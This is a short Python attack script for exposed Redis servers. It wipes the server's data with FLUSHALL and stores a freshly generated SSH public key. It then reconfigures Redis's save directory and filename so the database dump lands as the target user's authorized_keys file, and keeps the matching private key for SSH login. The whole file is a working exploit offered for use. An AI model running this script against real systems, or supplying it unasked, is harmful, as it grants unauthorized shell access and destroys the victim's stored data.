from naive_redis_client import NaiveRedisClient
from Crypto.PublicKey import RSA
import argparse


def generate_key_pair():
    prvkey = RSA.generate(1024)
    pubkey = prvkey.publickey()
    return(prvkey, pubkey)


def save_keys(prvkey, pubkey):
    with open("private.pem", "wb") as f:
        f.write(prvkey.exportKey('PEM'))

    with open("public.pub", "wb") as f:
        f.write(pubkey.exportKey('OpenSSH'))


def read_file_content(filename):
    with open(filename, 'r') as f:
        content = f.read()
        return content


def is_error_message(msg):
    err = msg[0] == '-'
    if err:
        print(msg[5:])
    return err


def client_call_wrapper(function, *args):
    if len(args) > 0:
        msg = function(*args)
    else:
        msg = function()
    msg = msg.decode()
    return is_error_message(msg)


def main(args):
    private_key, public_key = generate_key_pair()
    print("Key pairs generated")

    try:
        client = NaiveRedisClient(args.host)
    except ConnectionRefusedError:
        print("Unable to connect. Port might not be accessible")
        return

    client.flushall()
    payload = public_key.exportKey('OpenSSH').decode()
    print("Redis flushed")
    if client_call_wrapper(client.set, 'gift', "\\n\\n{0}\\n\\n".format(payload)):
        return
    print("public key added to redis")
    if client_call_wrapper(client.config_set, 'dir', args.ssh_dir):
        return
    print("Home directory set")
    if client_call_wrapper(client.config_set, 'dbfilename', 'authorized_keys'):
        return
    print("DB filename changed")
    if client_call_wrapper(client.save):
        return
    print("Setting saved")
    client.close()
    save_keys(private_key, public_key)
    print("Done")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Place ssh keys in a home directory that Redis has access to')
    parser.add_argument('host')
    parser.add_argument('ssh_dir')
    args = parser.parse_args()
    print(args)
    main(args)
